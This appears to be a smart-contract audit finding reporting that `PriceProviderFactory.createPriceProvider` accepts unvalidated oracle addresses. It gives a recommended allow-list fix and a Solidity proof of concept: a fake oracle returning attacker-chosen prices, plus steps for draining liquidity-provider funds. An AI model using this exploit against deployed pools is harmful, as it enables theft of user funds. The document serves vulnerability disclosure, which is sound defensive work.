### Title
Unvalidated Oracle Address in `PriceProviderFactory.createPriceProvider` Allows Fake Oracle to Feed Attacker-Controlled Prices into Pools — (`smart-contracts-poc/contracts/PriceProviderFactory.sol`)

---

### Summary

`PriceProviderFactory.createPriceProvider` is a permissionless function that accepts an arbitrary `_oracle` address and an arbitrary `_feedId` with no validation. Any caller can deploy a `PriceProvider` backed by a fake oracle contract that returns attacker-controlled `(mid, spread, refTime)` values. Because the factory immediately registers the resulting provider in its `_providers` set, `isProvider()` returns `true` for it — satisfying the public-pool eligibility predicate. A pool configured with this provider executes swaps at the attacker-chosen price, enabling direct extraction of LP principal.

---

### Finding Description

`AnchoredProviderFactory.createAnchoredProvider` enforces an admin-curated oracle allow-list before deploying any provider:

```solidity
if (!_oracles.contains(oracle)) revert OracleNotAllowed(oracle);
```

`PriceProviderFactory.createPriceProvider` has no equivalent guard:

```solidity
function createPriceProvider(
    address _oracle,   // ← accepted without any validation
    bytes32 _feedId,   // ← accepted without any validation
    int256  _marginStep,
    uint256 _maxTimeDelta,
    address _baseToken,
    address _quoteToken
) external override returns (address provider) {
    PriceProvider p = new PriceProvider(
        address(this),
        _oracle,       // stored as immutable offchainOracle
        _feedId,       // stored as immutable offchainFeedId
        ...
    );
    _providers.add(provider);   // isProvider() == true immediately
``` [1](#0-0) 

The `PriceProvider` constructor stores the oracle without any interface or legitimacy check:

```solidity
offchainOracle = IOffchainOracle(_oracle);
offchainFeedId = _offchainFeedId;
``` [2](#0-1) 

At swap time, `_getBidAndAskPrice` calls the stored oracle unconditionally:

```solidity
(uint256 mid, uint256 spread, , uint256 refTime) =
    IPricedOracle(address(offchainOracle)).price(offchainFeedId, msg.sender);
``` [3](#0-2) 

A fake oracle bypasses every abuse-protection check that the real `OracleBase.price()` enforces (`inSwap()` binding, `registeredPool`, blacklist, `feedExists`), because those checks live inside the real oracle contract, not in `PriceProvider` itself. [4](#0-3) 

The contrast with `AnchoredProviderFactory` is explicit — that factory maintains an admin-curated `_oracles` set and reverts `OracleNotAllowed` for any address not in it: [5](#0-4) 

---

### Impact Explanation

A pool whose price provider is backed by a fake oracle executes every swap at the attacker-chosen `mid` price. The attacker sets `mid` to an arbitrarily low value (e.g., 1 unit), making the pool's ask price negligible. Any trader (including the attacker) can then buy the pool's entire token inventory for near-zero cost, draining LP principal. This is a direct, quantifiable loss of user funds — matching the "bad-price execution" and "pool insolvency" impact categories.

---

### Likelihood Explanation

`createPriceProvider` is fully permissionless. No role, fee, or approval is required. The attacker needs only to deploy a fake oracle contract and call the factory once. The `isProvider()` predicate is satisfied immediately, so no further privileged step is needed before the poisoned provider can be attached to a pool (assuming pool creation is also permissionless, which is the standard design for this protocol).

---

### Recommendation

Add an admin-curated oracle allow-list to `PriceProviderFactory`, mirroring `AnchoredProviderFactory`:

```solidity
EnumerableSet.AddressSet private _oracles;

function addOracle(address oracle) external onlyRole(ADMIN_ROLE) { ... }

function createPriceProvider(address _oracle, ...) external {
    if (!_oracles.contains(_oracle)) revert OracleNotAllowed(_oracle);
    ...
}
```

Alternatively, validate that `_oracle` implements a known interface and is deployed by a trusted factory before registering the resulting provider in `_providers`.

### Proof of Concept

```solidity
// 1. Deploy a fake oracle that returns attacker-controlled prices
contract FakeOracle {
    function price(bytes32, address)
        external view
        returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
    {
        // Return an extremely low mid price with a non-zero spread
        // so PriceProvider's bid < ask check passes
        return (1e4, 50, 0, block.timestamp); // mid=1e4 (8-dec), spread=50 bps
    }
    function priceGuard(bytes32) external pure returns (uint128, uint128) {
        return (0, 0); // no guard
    }
}

// 2. Create a PriceProvider with the fake oracle — no validation, no revert
address fakeOracle = address(new FakeOracle());
address provider = PriceProviderFactory(factory).createPriceProvider(
    fakeOracle,
    bytes32(0),   // any feedId
    0,            // marginStep
    1 days,       // maxTimeDelta
    baseToken,
    quoteToken
);
// isProvider(provider) == true immediately

// 3. Set confidenceParam so bid != ask
PriceProviderFactory(factory).setConfidence(
    _arr(provider), _arr(1_000_000) // max confidence
);

// 4. Create a pool with this provider (permissionless pool factory)
// 5. LPs add liquidity; attacker swaps at mid=1e4 (real price ~1e12),
//    buying the entire token inventory for ~0 cost.
```

The staleness check passes because `refTime = block.timestamp`. The validity check passes because `mid > 0` and `spread < ORACLE_BPS`. The price guard is unset. The bid/ask are computed from the attacker-chosen `mid`, and the pool settles the swap at that price. [6](#0-5) [7](#0-6)

    function _getBidAndAskPrice() internal returns (uint128, uint128) {
        // 1. Read via the unified price(feedId, pool) path, forwarding the pool (msg.sender).
        //    refTime is already in seconds.
        (uint256 mid, uint256 spread, , uint256 refTime) =
            IPricedOracle(address(offchainOracle)).price(offchainFeedId, msg.sender);

        // 2. Staleness check
        if (_isStale(refTime, block.timestamp, MAX_TIME_DELTA)) {
            return (0, type(uint128).max);
        }

        // 3. Basic validity — price must be positive, spread must not be stalled marker
        if (mid == 0 || spread >= ORACLE_BPS) {
            return (0, type(uint128).max);
        }

        // 4. Price guard check (moved from oracle)
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(offchainFeedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) {
            return (0, type(uint128).max);
        }

        // 5. Compute bid/ask from mid + confidence-adjusted spread
        //    confidenceParam multiplies oracle spread; 0 means no spread
        uint256 adjustedSpread = spread * confidenceParam;
        (uint256 bid, uint256 ask) = _getBidAskFrom(mid, adjustedSpread);

        // 6. Apply marginStep adjustment
        (uint256 bidOut, bool bidOk) = _applyBidAdjustments(bid);
        if (!bidOk || bidOut > type(uint128).max) return (0, type(uint128).max);

        (uint256 askOut, bool askOk) = _applyAskAdjustments(ask);
        if (!askOk || askOut > type(uint128).max) return (0, type(uint128).max);

        // 7. Hard invariant: bid must be strictly less than ask.
        //    Can be violated when marginStep < 0 and confidence is too small.
        if (bidOut >= askOut) return (0, type(uint128).max);

        return (uint128(bidOut), uint128(askOut));
    }
